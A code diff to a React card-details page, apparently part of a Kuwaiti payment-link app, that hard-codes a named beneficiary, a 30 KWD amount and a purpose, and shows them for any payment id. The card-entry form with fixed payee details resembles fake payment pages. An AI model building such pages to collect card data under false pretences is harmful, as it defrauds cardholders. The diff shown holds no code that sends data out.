@@ -4,9 +4,30 @@ import { useParams, useNavigate } from "react-router-dom";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 
+// بيانات الدفع المطابقة لـ PaymentPage
+const paymentData = {
+  "pay_1755575829268_7kths83vaq_04xj": {
+    customerName: "يوسف غازي الرشيدي",
+    amount: 30.000,
+    currency: "KWD",
+    description: "Family Support"
+  }
+};
+
+const defaultPaymentData = {
+  customerName: "يوسف غازي الرشيدي",
+  amount: 30.000,
+  currency: "KWD",
+  description: "Family Support"
+};
+
 const CardDetails = () => {
   const { id } = useParams();
   const navigate = useNavigate();
+  
+  // الحصول على بيانات الدفع بناءً على المعرف
+  const currentPayment = paymentData[id as keyof typeof paymentData] || defaultPaymentData;
+  
   const [formData, setFormData] = useState({
     bank: "",
     cardNumber: "",
@@ -102,13 +123,19 @@ const CardDetails = () => {
           
           <div className="border-t border-gray-300 pt-3 sm:pt-6">
             <div className="flex justify-between items-center mb-3 sm:mb-6 text-sm sm:text-lg">
-              <span className="text-blue-600 font-medium">Request Via Link</span>
+              <span className="text-blue-600 font-medium">{currentPayment.customerName}</span>
               <span className="text-gray-800 font-medium">:المستفيد</span>
             </div>
             <div className="border-t border-gray-300 pt-2 sm:pt-4">
               <div className="flex justify-between items-center text-base sm:text-xl">
-                <span className="text-blue-600 font-bold">KD 50.000</span>
+                <span className="text-blue-600 font-bold">KD {currentPayment.amount.toFixed(3)}</span>
                 <span className="text-gray-800 font-medium">:المبلغ</span>
+              </div>
+            </div>
+            <div className="border-t border-gray-300 pt-2 sm:pt-4">
+              <div className="flex justify-between items-center text-sm sm:text-base">
+                <span className="text-blue-600 font-medium">{currentPayment.description}</span>
+                <span className="text-gray-800 font-medium">:الغرض</span>
               </div>
             </div>
           </div>
